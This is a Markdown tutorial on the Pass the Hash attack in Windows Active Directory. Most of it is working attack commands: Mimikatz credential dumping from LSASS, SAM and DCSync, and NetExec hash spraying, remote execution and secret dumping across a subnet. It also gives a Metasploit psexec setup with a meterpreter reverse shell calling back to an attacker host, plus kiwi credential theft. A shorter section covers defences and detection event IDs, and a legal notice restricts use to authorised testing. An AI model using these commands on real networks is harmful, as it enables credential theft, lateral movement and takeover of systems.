# Pass the Hash (PtH) Attack — A Practical Guide

> **Difficulty:** Intermediate  
> **Environment:** Active Directory (Windows)  
> **Goal:** Understand what Pass the Hash is, how NTLM authentication can be abused, and how to execute the attack step by step using real tools.

---

## Table of Contents

1. [What is Pass the Hash?](#what-is-pass-the-hash)
2. [How NTLM Authentication Works](#how-ntlm-authentication-works)
3. [What Actually Happens During the Attack](#what-actually-happens-during-the-attack)
4. [Step 1 — Dumping the Hash](#step-1--dumping-the-hash)
5. [Step 2 — Using the Hash](#step-2--using-the-hash)
   - [Option A — CrackMapExec / NetExec](#option-a--crackmapexec--netexec)
   - [Option B — Metasploit](#option-b--metasploit)
6. [Detection & Defense](#detection--defense)
7. [References](#references)

---

## What is Pass the Hash?

Pass the Hash is an attack where you **authenticate as a user without knowing their plaintext password** — only their NTLM hash.

Windows stores password hashes in memory and on disk. Once you grab a hash (from LSASS memory, the SAM database, or an NTDS.dit dump), you can use it directly in NTLM authentication. Windows never checks whether you derived the hash from a real password — it just accepts it.

```
Normal login:   username + password  →  hash computed  →  sent to server
Pass the Hash:  username + hash      →  sent directly  →  server accepts it
```

No cracking needed. If the account has admin rights somewhere on the network, you can move laterally immediately.

---

## How NTLM Authentication Works

NTLM is a challenge-response authentication protocol. Here is the full flow:

```
Client                        Server
  |                              |
  |--- NEGOTIATE_MESSAGE ------->|   "I want to authenticate"
  |                              |
  |<-- CHALLENGE_MESSAGE --------|   Server sends a random 8-byte challenge
  |                              |
  |--- AUTHENTICATE_MESSAGE ---->|   Client sends: username + NTLM_HASH(challenge)
  |                              |
  |<-- success / failure --------|
```

**The key point:** The client never sends the password. It sends `NTLM_HASH(challenge)`. If an attacker has the NTLM hash, they can compute the same response and authenticate as that user — the server cannot tell the difference.

---

## What Actually Happens During the Attack

```
[Step 1]  Gain initial access to any Windows machine (phishing, exploit, etc.)
[Step 2]  Dump NTLM hashes from LSASS memory using Mimikatz
[Step 3]  Pick a high-value hash (Domain Admin, local admin with reuse, etc.)
[Step 4]  Authenticate to other machines using that hash — no password needed
[Step 5]  Move laterally, dump more hashes, escalate
```

**Why does this work across machines?**  
Many environments reuse local administrator passwords. If `Administrator` has the same password hash on 50 machines, one compromised endpoint gives you all 50.

This is known as **lateral movement** via PtH.

---

## Step 1 — Dumping the Hash

Before you can pass a hash, you need one. The most common source is **LSASS memory** on a Windows machine you already have admin access to.

### Using Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) by **gentilkiwi** is the standard tool for credential dumping on Windows.

**Run from an elevated prompt (local admin or SYSTEM required):**

```cmd
mimikatz.exe
```

**Enable debug privileges:**

```
privilege::debug
```

**Dump credentials from LSASS memory:**

```
sekurlsa::logonpasswords
```

Look for entries like this in the output:

```
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : jdoe
Domain            : CORP
Logon Server      : DC01
        msv :
         [00000003] Primary
         * Username : jdoe
         * Domain   : CORP
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c   <-- this is what we need
```

**Dump only NTLM hashes (cleaner output):**

```
sekurlsa::msv
```

**Dump from the SAM database (local accounts only):**

```
token::elevate
lsadump::sam
```

**Dump domain hashes from NTDS.dit (must be run on a DC):**

```
lsadump::dcsync /domain:corp.local /all /csv
```

Or target a single user:

```
lsadump::dcsync /domain:corp.local /user:Administrator
```

> `dcsync` mimics a Domain Controller replication request — it pulls hashes without touching LSASS directly, making it stealthier.

---

### Hash Format

The NTLM hash you need looks like this:

```
8846f7eaee8fb117ad06bdd830b7586c
```

32 hex characters. When tools ask for `LM:NT` format, use:

```
aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

The first part is the LM hash (blank/disabled on modern Windows — always the same placeholder). The second part after `:` is the NTLM hash you actually use.

---

## Step 2 — Using the Hash

Once you have the hash, you can authenticate to any service that uses NTLM — SMB, WinRM, RDP (with restricted admin mode), LDAP, and more.

---

### Option A — CrackMapExec / NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) (the actively maintained fork of CrackMapExec) is the best tool for mass lateral movement and hash spraying across a network.

**Install:**

```bash
pip3 install netexec
# or
pipx install netexec
```

Both `nxc` and `crackmapexec` commands work depending on your version.

---

**Test a hash against a single target:**

```bash
nxc smb 192.168.1.20 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

A `[+]` means authentication succeeded. A `(Pwn3d!)` means you have local admin.

```
SMB  192.168.1.20  445  WIN10-01  [+] CORP\Administrator:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)
```

---

**Spray a hash across an entire subnet:**

```bash
nxc smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

Every machine that returns `(Pwn3d!)` is accessible with this hash.

---

**Execute a command remotely:**

```bash
nxc smb 192.168.1.20 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "whoami"
```

---

**Dump SAM hashes from a remote machine (requires local admin):**

```bash
nxc smb 192.168.1.20 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --sam
```

---

**Dump LSA secrets:**

```bash
nxc smb 192.168.1.20 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --lsa
```

---

**Get a shell via WinRM (if port 5985 is open):**

```bash
nxc winrm 192.168.1.20 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

---

**Breakdown of common flags:**

| Flag | Meaning |
|---|---|
| `smb` / `winrm` / `ldap` | Protocol to use |
| `-u` | Username |
| `-H` | NTLM hash (NT part only, or `LM:NT` format) |
| `-x` | Execute a command (cmd.exe) |
| `-X` | Execute a PowerShell command |
| `--sam` | Dump SAM hashes from remote target |
| `--lsa` | Dump LSA secrets from remote target |
| `--shares` | List SMB shares |
| `-d` | Domain name |

---

### Option B — Metasploit

Metasploit has several modules that support Pass the Hash natively.

**Start Metasploit:**

```bash
msfconsole
```

---

#### psexec — Remote command execution via SMB

```
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.20
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run
```

> Set `SMBPass` to the full `LM:NT` hash — Metasploit detects it automatically and performs PtH instead of password auth.

---

#### smb_login — Validate hashes across multiple hosts

```
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
set THREADS 10
run
```

---

#### After getting a Meterpreter shell — dump more hashes

```
meterpreter > hashdump
```

Or use the built-in Mimikatz post module:

```
use post/windows/gather/credentials/credential_collector
set SESSION 1
run
```

Or load kiwi (Mimikatz inside Meterpreter):

```
meterpreter > load kiwi
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
meterpreter > creds_all
```

---

## Detection & Defense

### For Defenders

**1. Enable Protected Users security group**  
Members of this group cannot authenticate using NTLM — only Kerberos. Eliminates PtH for those accounts.

```powershell
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"
```

**2. Enable Credential Guard**  
Isolates LSASS in a virtualization-based security (VBS) container. Mimikatz cannot read credentials directly from LSASS when Credential Guard is active.

```powershell
# Check if Credential Guard is enabled
Get-ComputerInfo | Select-Object -Property DeviceGuard*
```

Enable via Group Policy:  
`Computer Configuration → Administrative Templates → System → Device Guard → Turn On Virtualization Based Security`

**3. Eliminate local administrator password reuse**  
Use **LAPS (Local Administrator Password Solution)** — it sets a unique, random password on every machine's local admin account, automatically rotated.

```powershell
# Install LAPS
Install-Module -Name LAPS
# Or via GPO — Computer Configuration → LAPS
```

**4. Restrict NTLM usage**  
Force Kerberos-only authentication where possible. Block outbound NTLM via Group Policy:  
`Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Network Security: Restrict NTLM`

**5. Monitor for suspicious NTLM authentications**

- **Event ID 4624** — Successful logon  
  Filter for: `Logon Type 3` (network) + `Authentication Package: NTLM` from unexpected sources
- **Event ID 4648** — Logon using explicit credentials  
  Lateral movement often triggers this
- **Event ID 4776** — NTLM credential validation on a DC  
  High volume from a single source = hash spraying

**6. Disable NTLMv1 — enforce NTLMv2 minimum**

```
Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
→ Network Security: LAN Manager authentication level
→ Set to: Send NTLMv2 response only. Refuse LM & NTLM
```

### Detection Summary

| Signal | Event ID | What to look for |
|---|---|---|
| Lateral movement via SMB | 4624 | Logon Type 3, NTLM auth, unusual source IP |
| Explicit credential use | 4648 | Logon with alternate credentials |
| NTLM auth on DC | 4776 | High frequency from single host |
| LSASS access | 4656 / 4663 | Process opening LSASS handle (Mimikatz) |
| Mimikatz / kiwi | — | EDR alerts, `privilege::debug` in process args |

---

## References

- [Mimikatz by gentilkiwi](https://github.com/gentilkiwi/mimikatz)
- [NetExec (CrackMapExec fork)](https://github.com/Pennyw0rth/NetExec)
- [NetExec documentation](https://www.netexec.wiki/)
- [Metasploit psexec module](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/)
- [Microsoft — Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [Microsoft — LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [MITRE ATT&CK T1550.002 — Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)

---

> **Legal notice:** This guide is for educational purposes and authorized penetration testing only. Running these attacks against systems you do not own or have explicit written permission to test is illegal.
